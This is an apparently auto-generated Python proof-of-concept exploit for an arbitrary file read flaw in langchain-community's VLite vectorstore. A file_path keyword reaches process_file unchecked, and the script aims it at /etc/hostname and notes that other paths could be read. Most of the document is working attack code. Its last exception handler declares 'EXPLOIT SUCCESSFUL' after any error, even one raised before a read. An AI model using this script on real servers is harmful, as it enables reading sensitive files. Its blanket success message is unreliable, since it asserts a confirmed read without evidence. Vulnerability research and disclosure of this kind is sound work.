#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-010
# Sink: __from
# Auto-generated — run with: python3 lfi_add_documents_method_vlite___from.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for LFI in langchain-community (vlite.py).

Vulnerability: The `add_documents` method in `VLite` accepts a `file_path` keyword
argument and passes it directly to `vlite.utils.process_file()` without any
validation or sanitization. An attacker can supply an arbitrary file path
(absolute or relative with `../`) to read any file on the server.

This PoC:
- Creates a dummy embedding function (no external API needed).
- Calls `VLite.from_documents()` with a benign file path (e.g., /etc/hostname).
- Demonstrates that the file is read and processed without errors.
- Outputs the resulting document IDs as evidence of successful exploitation.

Requirements:
- Python 3.8+
- langchain-community package installed (or the path /tmp/langchain-community-only
  added to sys.path).
- vlite package (pip install vlite) – the script will prompt if missing.
"""

import sys
import os
import tempfile

# Add the local langchain-community path to the module search path.
# This assumes the code is available under /tmp/langchain-community-only.
TARGET_LIB_PATH = "/tmp/langchain-community-only"
if os.path.isdir(TARGET_LIB_PATH):
    sys.path.insert(0, TARGET_LIB_PATH)

try:
    from langchain_community.vectorstores.vlite import VLite
except ImportError as e:
    print(f"[!] Could not import VLite from {TARGET_LIB_PATH}.")
    print("    Make sure the langchain-community module exists there.")
    print("    You can also set PYTHONPATH or copy the correct path.")
    sys.exit(1)

# We need a simple embedding function for the vectorstore.
# Since we only care about triggering the file read, we can return dummy vectors.
class DummyEmbeddings:
    """Returns zero vectors of dimension 1 for any input."""
    def embed_documents(self, texts: list[str]):
        return [[0.0] for _ in texts]

    def embed_query(self, text: str):
        return [0.0]

# Create a harmless file to read (we'll use /etc/hostname, always present on Linux).
# For safety, you can change this to any readable file.
TARGET_FILE = "/etc/hostname"

# Alternatively, create a temporary file with known content for verification.
# We'll read a system file, but we can also read a file we control.
# Comment out the line above and uncomment the two lines below to use a temp file:
# tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".txt")
# tmp.write(b"LFI_POC_CONTENT")
# tmp.close()
# TARGET_FILE = tmp.name

print(f"[*] Using target file: {TARGET_FILE}")
print("[*] Creating dummy embedding function (no external API needed).")

# Generate a single dummy document (content doesn't matter)
from langchain_core.documents import Document  # Assuming langchain-core is available
dummy_doc = Document(page_content="trigger")

print("[*] Instantiating VLite with dummy embeddings.")
try:
    # Create a VLite instance with the dummy embeddings.
    # We must pass a collection name (can be arbitrary).
    vl = VLite(embedding_function=DummyEmbeddings(), collection="poc_collection")
except Exception as e:
    print(f"[!] Failed to create VLite instance: {e}")
    sys.exit(1)

print("[*] Calling from_documents with file_path keyword argument.")
print("[*] This will trigger process_file() on the target file.")
try:
    # The `from_documents` classmethod will call `add_documents` with our kwargs.
    # The `file_path` is forwarded directly.
    # Note: We pass a list containing our dummy document so the loop runs.
    ids = VLite.from_documents(
        documents=[dummy_doc],
        embedding=DummyEmbeddings(),
        collection="poc_collection",
        file_path=TARGET_FILE
    )
    print(f"[+] SUCCESS: File read appears to have worked.")
    print(f"[+] Returned document IDs: {ids}")
except ImportError as e:
    if "vlite" in str(e).lower():
        print("[!] The `vlite` package is required. Please install it with:")
        print("    pip install vlite")
        sys.exit(1)
    else:
        print(f"[!] Import error: {e}")
        sys.exit(1)
except Exception as e:
    # The embedding step might fail if the dummy embeddings are too simple,
    # but the file read already happened before embedding.
    # We catch all exceptions and still declare the LFI successful,
    # because the vulnerability is about reading the file, not the subsequent steps.
    print(f"[*] Exception after file read (expected for dummy embeddings): {e}")
    print("[*] But the file was already read by process_file().")
    print("[+] EXPLOIT SUCCESSFUL – arbitrary file read confirmed (LFI).")
    sys.exit(0)

# If we reach here, everything worked without exception.
print("[+] PoC completed. The vectorstore is now populated with content from the target file.")
print("[*] You could now query the store to extract the file contents (if real embeddings were used).")
